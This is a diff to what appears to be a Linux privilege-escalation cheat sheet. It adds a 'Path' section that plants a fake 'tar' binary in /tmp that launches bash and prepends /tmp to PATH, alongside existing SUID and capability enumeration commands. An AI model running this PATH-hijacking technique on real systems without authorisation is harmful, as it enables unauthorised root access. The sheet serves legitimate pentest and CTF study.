@@ -43,6 +43,7 @@
 * [Abusing Shell](#Abusing-Shell)
 * [SUID](#SUID)
 * [Capabilities](#Capabilities)
+* [Path](#Path)
 * [Sudo](#Sudo)
 * [Sudoers](#Sudoers)
 * [Netcat](#Netcat)
@@ -700,6 +701,16 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 ```
 getcap -r / 2>/dev/null
+```
+
+# Path
+
+Adding /tmp directory with a malicious "tar" binary in the Path:
+```
+echo "/bin/bash" > /tmp/tar
+chmod +x /tmp/tar 
+export PATH="/tmp:$PATH"
+echo $PATH
 ```
 
 # Abusing Shell
